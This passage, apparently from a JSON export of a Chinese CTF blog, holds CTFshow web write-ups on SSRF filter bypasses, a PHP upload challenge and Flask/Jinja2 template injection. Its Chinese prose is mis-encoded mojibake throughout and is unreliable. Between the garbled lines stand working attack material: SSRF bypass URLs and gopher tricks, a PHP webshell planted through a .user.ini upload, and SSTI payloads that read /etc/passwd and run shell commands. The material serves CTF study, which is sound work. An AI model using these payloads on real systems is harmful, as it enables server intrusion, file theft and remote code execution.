å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰\n\n## ç›¸å…³å‡½æ•°å’Œç±»\n\nfile_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­\nreadfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹\nfsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥\ncurl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨\nfopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URL\nPHPåŸç”Ÿç±»SoapClientåœ¨è§¦å‘ååºåˆ—åŒ–æ—¶å¯å¯¼è‡´SSRF\n\n## ç›¸å…³åè®®\n\nfileåè®®ï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶çš„å†…å®¹\ndictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰\ngopheråè®®ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell\nhttp/såè®®ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»\n\n## ç»•è¿‡æ–¹æ³•\n\n- `http://0.0.0.0/`\n\n  æµ‹è¯•äº†ä¸‹è¿™ä¸ªæ–¹æ³•åªèƒ½åœ¨linuxä¸‹ä½¿ç”¨ï¼Œwindowså¹¶ä¸è®¤è¯†è¿™ä¸ªIP\n\n- `http://foo@127.0.0.1:80@www.google.com/hint.php`\n\n  æ­¤å¤„åˆ©ç”¨äº†ä¸åŒåº“è§£æurlçš„å·®å¼‚\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206181201647.JPG)\n\n  ä¸è¿‡è¿™ä¸ªæ–¹æ³•åœ¨curlè¾ƒæ–°çš„ç‰ˆæœ¬é‡Œè¢«ä¿®æ‰äº†ï¼Œbuuä¸Šçš„ç¯å¢ƒä¹Ÿæ— æ³•ä½¿ç”¨\n\n- DNS Rebinding\n\n  ç”¨è¿™ä¸ªï¼Œå°†åŒä¸€åŸŸåç»‘å®šåœ¨ä¸åŒçš„IPä¸‹ï¼Œè¿™æ ·è¿”å›DNSè¯·æ±‚æŸ¥è¯¢çš„æ—¶å€™éšæœºè¿”å›ä¸€ä¸ªï¼Œå°±å¯¼è‡´åˆ¤æ–­å’ŒçœŸæ­£curlå‘é€è¯·æ±‚çš„ä¸æ˜¯åŒä¸€ä¸ªIP\n\n- `http://127ã€‚0ã€‚0ã€‚1/hint.php`\n\n  è¿™ä¸ªæœ¬åœ°å€’æ˜¯æµ‹è¯•æˆåŠŸäº†ï¼Œbuuä¸Šå°±ä¸è¡Œï¼Œå¯èƒ½è·Ÿcurlç‰ˆæœ¬æœ‰å…³å§\n\n- `http://127.1/hint.php`\n\n  `ip2long('127.1')`ä¼šè¿”å›`false`ï¼Œè¿™é‡Œå¯ä»¥ç»•è¿‡\n\n  ä½†æ˜¯`gethostbyname`åœ¨linuxä¸‹ä¼šæŠŠ`127.1`å˜ä¸º`127.0.0.1`ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯æ— æ³•ä½¿ç”¨çš„\n\n  ä¸è¿‡windowsä¸‹ç»è¿‡`gethostbyname`åä¾ç„¶æ˜¯`127.1`ï¼Œcurlæ˜¯æ”¯æŒ`127.1`è¿™æ ·çš„å†™æ³•çš„ï¼Œä½†è¿™æ ·å‘å‡ºå»çš„httpè¯·æ±‚æ˜¯æœ‰é—®é¢˜çš„ã€‚å› ä¸ºhttpåŒ…ä¸­çš„hostå¤´è¢«è®¾ä¸ºäº†`127.1`ï¼Œapacheä¼šè¿”å›ä¸€ä¸ª400 Bad Request\n\n  ä½†æ˜¯è¿™æ ·æ„é€ çš„gopherè¯·æ±‚æ˜¯å¯è¡Œçš„\n\n- è¿›åˆ¶ç»•è¿‡\n\n- å’Œ127.1ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å­˜åœ¨ä¸èƒ½ç”¨httpçš„é—®é¢˜ï¼Œä½†æ˜¯`gethostbyname`å¹¶ä¸ä¼šæœ‰å½±å“ï¼Œå¯ç”¨æ¯”å¦‚\n\n  ```\n  gopher://0177.0.0x0001:80\n  ```\n\n- `http://127.0.0.1./`\n\n  curlä¸æ”¯æŒ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**351**\n\n```PHP\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n?>\n# curl_init â€” åˆå§‹åŒ– cURL ä¼šè¯    \n# curl_setopt â€” è®¾ç½®ä¸€ä¸ªcURLä¼ è¾“é€‰é¡¹\n# curl_exec â€” æ‰§è¡Œ cURL ä¼šè¯\n# curl_close â€” å…³é—­ cURL ä¼šè¯\n```\n\n\n\n```\npayload:\nPOST:\nurl=http://127.0.0.1/flag.php\n```\n\n**352**\n\n`parse_url`å‡½æ•°ä½œç”¨æ˜¯å°†ä¸€ä¸ªURLæ‹†åˆ†ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\n\n```PHP\n<?php\n$url = 'http://username:password@hostname/path?arg=value#anchor';\nprint_r(parse_url($url));\n?>\nä»¥ä¸Šä¾‹ç¨‹ä¼šè¾“å‡ºï¼š\nArray\n(\n[scheme] => http\n[host] => hostname\n[user] => username\n[pass] => password\n[path] => /path\n[query] => arg=value\n[fragment] => anchor\n)\n```\n\nåŒä¸Šå³å¯\n\n**353**\n\nç»•è¿‡127.0.0.1ï¼Œå¯ä½¿ç”¨è¿›åˆ¶è½¬æ¢æˆ–å…¶ä»–IP\n\n```\nè¿›åˆ¶è½¬æ¢ï¼š\næ•´æ•°è½¬æ¢è¿‡ç¨‹ï¼Œå°†æ¯ä¸€ä½IPè½¬æ¢ä¸ºäºŒè¿›åˆ¶å¹¶è¿›è¡Œæ‹¼æ¥\n2130706433 //åè¿›åˆ¶æ•´æ•°\n0x7F.0.0.1 //åå…­è¿›åˆ¶\n0177.0.0.1 //å…«è¿›åˆ¶\n0x7F000001 //åå…­è¿›åˆ¶æ•´æ•°\n```\n\n```\nå…¶ä»–IPï¼š\n127.127.127.127\n0\n0.0.0.0\n```\n\n**354**\n\nè¿‡æ»¤æ²¡äº†ï¼Œåªèƒ½æŒ‡å‘å…¶ä»–åŸŸå\n\n1ã€å°†è‡ªå·±åŸŸåè§£æä¸º127.0.0.1\n\n2ã€å°†è‡ªå·±ç½‘ç«™è®¾ç½®ä¸º302é‡å®šå‘åˆ°127.0.0.1\n\n**355**\n\nç”¨0æˆ–è€…127.1\n\n0åœ¨linuxç³»ç»Ÿä¸­ä¼šè§£ææˆ127.0.0.1åœ¨windowsä¸­è§£ææˆ0.0.0.0\n\n**356**\n\næ›´çŸ­äº†åªèƒ½ç”¨0\n\n**357**\n\n```PHP\ngethostbyname â€” è¿”å›ä¸»æœºåå¯¹åº”çš„ IPv4åœ°å€\n# php filterå‡½æ•°\nfilter_var()\tè·å–ä¸€ä¸ªå˜é‡ï¼Œå¹¶è¿›è¡Œè¿‡æ»¤\nfilter_var_array()\tè·å–å¤šä¸ªå˜é‡ï¼Œå¹¶è¿›è¡Œè¿‡æ»¤\n......\n# PHP è¿‡æ»¤å™¨\nFILTER_VALIDATE_IP\tæŠŠå€¼ä½œä¸º IP åœ°å€æ¥éªŒè¯ï¼Œåªé™ IPv4 æˆ– IPv6 æˆ– ä¸æ˜¯æ¥è‡ªç§æœ‰æˆ–è€…ä¿ç•™çš„èŒƒå›´\nFILTER_FLAG_IPV4 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv4 IPï¼ˆæ¯”å¦‚ 255.255.255.255ï¼‰\nFILTER_FLAG_IPV6 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv6 IPï¼ˆæ¯”å¦‚ 2001:0db8:85a3:08d3:1319:8a2e:0370:7334ï¼‰\nFILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰\nFILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚\n```\n\nç”±äºè·å–åˆ°äº†æŒ‡å‘åŸŸåçš„IPå€¼æ‰€ä»¥åŸŸåæŒ‡å‘127.0.0.1ä¸å†ç”Ÿæ•ˆï¼Œåªèƒ½ä½¿ç”¨302é‡å®šå‘æˆ–è€…**DNS rebindingï¼ˆDNSé‡æ–°ç»‘å®šæ”»å‡»ï¼‰**\n\n### DNS rebindingï¼š\n\n```\næ”»å‡»é‡ç‚¹åœ¨äºDNSæœåŠ¡èƒ½å¤Ÿåœ¨ä¸¤æ¬¡DNSæŸ¥è¯¢ä¸­è¿”å›ä¸ç”¨çš„IPåœ°å€ï¼Œç¬¬ä¸€æ¬¡æ˜¯çœŸæ­£çš„IPï¼Œç¬¬äºŒæ¬¡æ˜¯æ”»å‡»ç›®æ ‡IPåœ°å€ï¼Œç”šè‡³å¯ä»¥é€šè¿‡è¿™ç§æ”»å‡»æ–¹æ³•ç»•è¿‡åŒæºç­–ç•¥\nå›åˆ°é¢˜ç›®ï¼Œåœ¨é¢˜ç›®ä»£ç ä¸­ä¸€å…±å¯¹åŸŸåè¿›è¡Œäº†ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡æ˜¯ gethostbyname æ–¹æ³•ï¼Œç¬¬äºŒæ¬¡åˆ™æ˜¯ file_get_contents æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥é€šè¿‡ ceye.io æ¥å®ç°æ”»å‡»ï¼ŒDNS Rebinding ä¸­è®¾ç½®ä¸¤ä¸ª IPï¼Œä¸€ä¸ªæ˜¯ 127.0.0.1 å¦ä¸€ä¸ªæ˜¯éšä¾¿å¯ä»¥è®¿é—®çš„ IP\n```\n\n**358**\n\næ­£åˆ™åŒ¹é…è¦æ±‚URLä»¥http://ctf.å¼€å¤´ï¼Œä»¥showç»“å°¾\n\nä¸€ä¸ªå®Œæ•´çš„URLçš„æ ¼å¼å¦‚ä¸‹\n\n`http://username:password@hostname/path?arg=value#anchor`\n\nå…¶ä¸­hostnameå°±æ˜¯æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„ç½‘å€ï¼Œæˆ‘ä»¬åªéœ€è¦è®©usernameä½ç½®ä¸ºctf.ï¼Œè®©anchorä½ç½®ä¸ºshowå³å¯\n\n```\npayload:\nPOST\nurl=http://ctf.@127.0.0.1/flag.php#show\n```\n\n**359**\n\néšä¾¿è¾“å…¥ä¸ªç”¨æˆ·åå¯†ç å°è¯•ç™»å½•\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-01 01.12.20.png)\n\næŠ“åŒ…å‘ç°returlå‚æ•°å¯èƒ½å­˜åœ¨SSRFæ³¨å…¥ç‚¹ï¼Œä½¿ç”¨Gopherusç”Ÿæˆæ”»å‡»payload\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-01 22.36.11.png)\n\nå†™å…¥ä¹‹åè®¿é—®å³å¯\n\n**360**\n\nåŒä¸Š\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-01 22.44.48.png)\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFshowè®°å½•","url":"/posts/82271b5a.html","content":"\n### babyæ¯â€”â€”baby_php\n\nå®¡è®¡ä»£ç ï¼Œæ˜æ˜¾æ˜¯æ–‡ä»¶ä¸Šä¼ \n\n```PHP\nclass fileUtil{\n\n    private $name;\n    private $content;\n\n\n    public function __construct($name,$content=''){\n        $this->name = $name;\n        $this->content = $content;\n        ini_set('open_basedir', '/var/www/html');\n    }\n\n    public function file_upload(){\n        if($this->waf($this->name) && $this->waf($this->content)){\n            return file_put_contents($this->name, $this->content);\n        }else{\n            return 0;\n        }\n    }\n\n    private function waf($input){\n        return !preg_match('/php/i', $input);\n    }\n\n    public function file_download(){\n        if(file_exists($this->name)){\n            header('Content-Type: application/octet-stream');\n            header('Content-Disposition: attachment; filename=\"'.$this->name.'\"');\n            header('Content-Transfer-Encoding: binary');\n            echo file_get_contents($this->name);\n        }else{\n            return False;\n        }\n    }\n\n    public function __destruct(){\n\n    }\n\n}\n\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload':\n        $name = $_POST['name'];\n        $content = $_POST['content'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_upload()){\n            echo $name.' upload success!';\n        }\n        break;\n    case 'download':\n        $name = $_POST['name'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_download()===False){\n            echo $name.' download failed';\n        }\n        break;\n    default:\n        echo 'baby come on';\n        break;\n}\n```\n\nå°çŸ¥è¯†ï¼š$_GET['a']åœ¨æ²¡æœ‰è¢«èµ‹å€¼æ—¶é»˜è®¤å€¼æ—¶trueï¼Œcaseçš„åˆ¤å®šæ˜¯å¼±ç›¸ç­‰\n\nå…³é”®ä»£ç \n\n```PHP\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){//aåªå£°æ˜ä¸èµ‹å€¼é»˜è®¤ä¸ºtrueï¼Œå¼ºç›¸ç­‰åˆ¤å®šæ— æ³•é€šè¿‡\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload'://true==\"upload\"ï¼Œåˆ¤å®šç»“æœä¸ºçœŸï¼Œè¿›å…¥uploadä¸Šä¼ æ–‡ä»¶\n```\n\næŸ¥çœ‹å“åº”å¤´ä¸­é—´ä»¶ä¸ºnginxï¼Œä¸Šä¼ .user.iniæ–‡ä»¶æ¥åŒ…å«ï¼Œä¸€å®šè¦å…ˆä¸Šä¼ 1.txtæ–‡ä»¶ï¼Œä¸ç„¶åœ¨auto_prepend_fileå‚æ•°ç”Ÿæ•ˆå¹¶ä¸”æ‰¾ä¸åˆ°1.txtæ—¶æ•´ä¸ªç¯å¢ƒå°±åºŸäº†\n\n```\npayload:?a=\nPOST:\ncontent=<?=`$_GET['kkk']`;?>&name=1.txt\nPOST:\ncontent=auto_prepend_file=\"1.txt\"&name=.user.ini\n\npayload:?kkk=tac /flag_baby_here_you_are\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSTI","url":"/posts/45647.html","content":"\n# SSTI\n\n### **Pythonä¸­æœ‰ç”¨çš„é­”æœ¯æ–¹æ³•**\n\n```python\n__class__           æŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»\n__mro__             æŸ¥çœ‹ç»§æ‰¿å…³ç³»å’Œè°ƒç”¨é¡ºåºï¼Œè¿”å›å…ƒç»„\n__base__            è¿”å›åŸºç±»\n__bases__           è¿”å›åŸºç±»å…ƒç»„\n__subclasses__()    è¿”å›å­ç±»åˆ—è¡¨\n__init__            è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥è·³åˆ°__globals__\n__globals__         è¿”å›å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œè¿”å›å­—å…¸\n__builtins__        è¿”å›å†…å»ºå†…å»ºåç§°ç©ºé—´å­—å…¸\n__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ\n__getattribute__()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚:a.xxx/a.xxx()ï¼‰\t\téƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚\n__getitem__()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a['b']ï¼Œå°±æ˜¯a.__getitem__('b')\n__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚\n__import__           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__('os').popen('ls').read()\n__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚\nurl_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_app\nget_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_app\nlipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__['os'].popen('ls').read()}}\n{{cycler.__init__.__globals__.os.popen('ls').read()}}\ncurrent_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡\nrequest              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\nrequest.args.x1   \t getä¼ å‚\nrequest.values.x1 \t æ‰€æœ‰å‚æ•°\nrequest.cookies      cookieså‚æ•°\nrequest.headers      è¯·æ±‚å¤´å‚æ•°\nrequest.form.x1   \t postä¼ å‚\t(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)\nrequest.data  \t\t postä¼ å‚\t(Content-Type:a/b)\nrequest.json\t\t postä¼ json  (Content-Type: application/json)\nconfig               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n### ä»£ç å—\n\n```\nå˜é‡å— {{}}\tç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º\næ³¨é‡Šå— {##}\tæ³¨é‡Š\næ§åˆ¶å—\t{%%}\tå¯ä»¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯­å¥\nè¡Œå£°æ˜\t##\t\tå¯ä»¥æœ‰å’Œ{%%}ç›¸åŒçš„æ•ˆæœ\n```\n\n### å¸¸ç”¨çš„è¿‡æ»¤å™¨\n\n```\nint()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›\nfloat()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›\nlower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›\nupper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›\ntitle()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›\ncapitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›\ntrim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›\nwordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›\nreverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›\nreplace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›\ntruncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›\nstriptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›\nescape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†<ã€>ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚\nsafe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š {{'<em>hello</em>'|safe}}ï¼›\nlist()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›\nstring()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›\njoin()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›\nabs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›\nfirst()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›\nlast()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›\nformat(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š{{ \"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}å°†è¾“å‡ºï¼šHelloo? - Foo!\nlength()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›\nsum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›\nsort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›\ndefault(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default('xiaotuo')----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚\nlength()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count\n```\n\n### **Flaskçš„ä¸€äº›å…¨å±€å˜é‡ && å…³é”®å­—**\n\n```python\n{{config}}\n{{requests}}\n{{requests.environ}}\n{{self}}\n{{url_for}}\n{{get_flashed_messages}}\n{{url_for.__globals__[\"os\"].system('calc')}}\n```\n\n### å¸¸ç”¨payload\n\n```\n>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\n>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n//æƒ³è¦è·å–å‘½ä»¤æ‰§è¡Œç»“æœå¯ä»¥åœ¨åé¢åŠ ä¸Š.read()\n>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()\n \n--------------------------------\n \n>>>object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()\n \n--------------------------------\n{{''.__class__.__mro__[-1].__subclasses__()[200]('calc') }}\nå…¶ä¸­çš„xxxxå¯ä»¥ä¸ºä»»æ„å­—ç¬¦\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(\"__import__('os').popen('whoami').read()\") }}\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(\"__import__('os').popen('calc').read()\") }} #æœ¬åœ°æµ‹è¯•ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰§è¡Œwhoamiåªä¼šè¿”å›None\n\n```\n\n[æ‹“å±•](https://dar1in9s.github.io/2020/09/15/sstiè¿›é˜¶/)\n\n### 16è¿›åˆ¶ç»•è¿‡\n\nå¯ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡å…³é”®å­—ç¬¦\n\n```\n\\x5f _\n```\n\nå¯»æ‰¾å¯ç”¨ç±»è„šæœ¬\n\n```python\nimport json\n\na = \"\"\"\n\"\"\"\n\nnum = 0\nallList = []\n\nresult = \"\"\nfor i in a:\n    if i == \">\":\n        result += i\n        allList.append(result)\n        result = \"\"\n    elif i == \"\\n\" or i == \",\":\n        continue\n    else:\n        result += i\n\nfor k, v in enumerate(allList):\n    if \"os._wrap_close\" in v:\n        print(str(k) + \"--->\" + v)\n```\n\n#### 